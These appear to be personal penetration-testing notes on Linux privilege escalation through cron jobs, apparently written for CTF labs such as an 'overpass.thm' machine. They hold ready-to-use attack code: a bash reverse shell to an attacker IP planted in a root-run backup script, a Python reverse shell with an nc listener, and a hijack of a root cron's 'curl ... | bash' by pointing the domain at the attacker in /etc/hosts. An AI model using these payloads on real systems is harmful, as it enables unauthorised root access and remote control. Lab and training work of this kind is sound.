There are specific directories that we may be able to utilize to add new Cron jobs if we have the write permissions over them. These include:

```sh
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root

# Command
crontab -l

# Find cron job logs
cat /var/log/syslog
```

![[Pasted image 20230527090515.png]]

---
# Bash
You can see the `backup.sh` script was configured to run every minute. The content of the file shows a simple script that creates a backup of the prices.xls file.

![[Pasted image 20230527090535.png]]

As our current user can access this script, we can easily modify it to create a reverse shell, hopefully with root privileges.

```sh
#!/bin/bash
bash -i >& /dev/tcp/10.17.36.8/6666 0>&1
```

![[Pasted image 20230527090749.png]]

---
# Python
To create a Python file with a reverse shell :-

```python
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888)) 
dup2(s.fileno(),0)
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])
```

And `rlwrap -f . -r nc -nvlp 8888` on our machine!

---
# tar
[Tar Wildcard Injection PrivEsc | Exploit Notes (hdks.org)](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/tar-wildcard-injection-privesc/)

---
# /etc/hosts file
```sh
james@overpass-prod:~$ cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

We see that the cronjob fetches the buildscript from the website and pipes it to bash. To exploit this we’d need to somehow redirect the domain to our IP.
```sh
# /etc/hosts file (Check if it's Writeable)
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm  # Replace 127.0.0.1 with your IP
```

Setup a **Python** server on port 80 & create the `buildscript.sh` file with a *Reverse Shell*.